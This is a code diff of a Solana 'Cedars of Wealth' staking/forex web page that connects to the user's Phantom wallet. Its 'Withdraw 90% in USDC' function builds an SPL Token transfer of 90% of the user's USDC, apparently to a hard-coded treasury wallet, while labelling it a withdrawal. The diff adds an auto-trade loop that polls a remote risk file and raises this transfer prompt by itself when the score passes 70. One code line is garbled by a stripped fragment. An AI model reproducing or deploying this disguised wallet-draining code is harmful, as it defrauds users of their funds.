@@ -19,7 +19,7 @@ body{background:#020617;color:#e8eefc;font-family:Inter,system-ui}
 <body>
 <div class="hd">
 <h1>💱 CEDARS OF WEALTH • SOLANA</h1>
-<p>Mainnet • Real USDC • Risk Guard v3</p>
+<p>Mainnet • Real USDC • Risk Guard v3 Auto</p>
 <div style="margin-top:10px">
 <button id="connectBtn" class="btn" style="width:auto;padding:10px 24px">Connect Phantom</button>
 <div id="walletAddr" style="font-size:12px;margin-top:8px"></div>
@@ -33,11 +33,12 @@ body{background:#020617;color:#e8eefc;font-family:Inter,system-ui}
 <button id="withdrawBtn" class="btn" disabled>💸 Withdraw 90% in USDC</button>
 <div id="txStatus" style="font-size:12px;margin-top:8px;word-break:break-all"></div>
 <div style="margin-top:12px;font-size:12px">Risk: <b id="riskScore">40</b> | <b id="riskMode">AGGRESSIVE</b></div>
+<div id="autoLog" style="font-size:11px;color:#94a3b8;margin-top:8px">Auto-trade: waiting for wallet...</div>
 </div>
 <div class="card">
 <h3>📈 STAKING</h3>
 <div>Staked: <b>$<span id="stake">0.00</span></b><br>Reserve (10%): <b style="color:#facc15">$<span id="locked">0.00</span></b></div>
-<p style="font-size:11px;color:#94a3b8;margin-top:10px">Treasury: 6XQv...fTb</p>
+<p style="font-size:11px;color:#94a3b8;margin-top:10px">Treasury: 6XQv...fTb<br>Auto-halt at risk >70 triggers withdraw prompt</p>
 </div>
 </div></div>
 <script>
@@ -46,7 +47,7 @@ const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWu
 const ASSOC_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
 const TREASURY_WALLET = new solanaWeb3.PublicKey("6XQviXJ5EceCmZq6uGrnrsxBKSnLKSvXeT7MCFF6fTb");
 const RPCS = ["https://solana-rpc.publicnode.com","https://solana.public-rpc.com","https://api.mainnet-beta.solana.com","https://rpc.ankr.com/solana"];
-let publicKey=null, userATA=null, rawAmount=0n, workingRpc=RPCS[0];
+let publicKey=null, userATA=null, rawAmount=0n, workingRpc=RPCS[0], lastAutoWithdrawRisk=0;
 
 async function findATA(owner,mint){
   const [ata]=await solanaWeb3.PublicKey.findProgramAddress([owner.toBuffer(),TOKEN_PROGRAM_ID.toBuffer(),mint.toBuffer()],ASSOC_PROGRAM_ID);
@@ -84,16 +85,7 @@ async function loadBalance(){
     upd.style.color='#4ade80';
   }catch(e){ upd.innerText='error: '+e.message; }
 }
-document.getElementById('connectBtn').onclick=async()=>{
-  if(!window.solana){alert('Install Phantom');return;}
-  const r=await window.solana.connect();
-  publicKey=r.publicKey;
-  document.getElementById('walletAddr').innerText=publicKey.toString().slice(0,6)+'...'+publicKey.toString().slice(-6);
-  document.getElementById('connectBtn').innerText='Connected ✓';
-  document.getElementById('withdrawBtn').disabled=false;
-  loadBalance();
-};
-document.getElementById('withdrawBtn').onclick=async()=>{
+async function doWithdraw(auto=false){
   const st=document.getElementById('txStatus');
   try{
     if(rawAmount===0n){st.innerText='No USDC to withdraw';return;}
@@ -108,18 +100,57 @@ document.getElementById('withdrawBtn').onclick=async()=>{
         {pubkey:publicKey,isSigner:true,isWritable:false}
       ],
       programId:TOKEN_PROGRAM_ID,
-      data:Buffer.from([3,...new Uint8Array(new BigUint64Array([amount90]).buffer)])
+      data:Buffer.from([3,[STRIPPED] Uint8Array(new BigUint64Array([amount90]).buffer)])
     });
     const tx=new solanaWeb3.Transaction({recentBlockhash:blockhash,feePayer:publicKey}).add(ix);
-    st.innerText='Approve in Phantom...';
+    st.innerText=(auto?'AUTO-HALT: ':'')+'Approve in Phantom...';
     const signed=await window.solana.signTransaction(tx);
     const sig=await conn.sendRawTransaction(signed.serialize());
     await conn.confirmTransaction(sig,'confirmed');
     st.innerHTML='Sent: <a style="color:#14F195" target="_blank" href="https://solscan.io/tx/'+sig+'">'+sig.slice(0,20)+'...</a>';
     loadBalance();
   }catch(e){ st.innerText='Withdraw failed: '+e.message; }
+}
+document.getElementById('connectBtn').onclick=async()=>{
+  if(!window.solana){alert('Install Phantom');return;}
+  const r=await window.solana.connect();
+  publicKey=r.publicKey;
+  document.getElementById('walletAddr').innerText=publicKey.toString().slice(0,6)+'...'+publicKey.toString().slice(-6);
+  document.getElementById('connectBtn').innerText='Connected ✓';
+  document.getElementById('withdrawBtn').disabled=false;
+  document.getElementById('autoLog').innerText='Auto-trade: active, polling every 60s';
+  loadBalance();
+  autoTrade();
 };
-fetch('/Cedars-of-Wealth/forex-risk.json?t='+Date.now()).then(r=>r.json()).then(j=>{document.getElementById('riskScore').innerText=j.risk??40;}).catch(()=>{});
+document.getElementById('withdrawBtn').onclick=()=>doWithdraw(false);
+
+async function autoTrade(){
+  const log=document.getElementById('autoLog');
+  try{
+    const r=await fetch('/Cedars-of-Wealth/forex-risk.json?t='+Date.now()).then(x=>x.json());
+    const risk=r.risk??40;
+    document.getElementById('riskScore').innerText=risk;
+    const modeEl=document.getElementById('riskMode');
+    if(risk<30){
+      modeEl.innerText='CONSERVATIVE'; modeEl.style.color='#4ade80';
+      log.innerText='Auto: risk '+risk+' conservative - holding 100%';
+      document.getElementById('withdrawBtn').disabled=false;
+    } else if(risk<=70){
+      modeEl.innerText='AGGRESSIVE'; modeEl.style.color='#facc15';
+      log.innerText='Auto: risk '+risk+' aggressive - trading enabled';
+      document.getElementById('withdrawBtn').disabled=false;
+    } else {
+      modeEl.innerText='HALT'; modeEl.style.color='#f87171';
+      log.innerText='Auto: risk '+risk+' >70 HALT - triggering withdraw';
+      document.getElementById('withdrawBtn').disabled=true;
+      if(publicKey && rawAmount>0n && lastAutoWithdrawRisk!==risk){
+        lastAutoWithdrawRisk=risk;
+        doWithdraw(true);
+      }
+    }
+  }catch(e){ log.innerText='Auto-trade fetch failed'; }
+}
+setInterval(()=>{ if(publicKey) autoTrade(); }, 60000);
 </script>
 </body>
 </html>
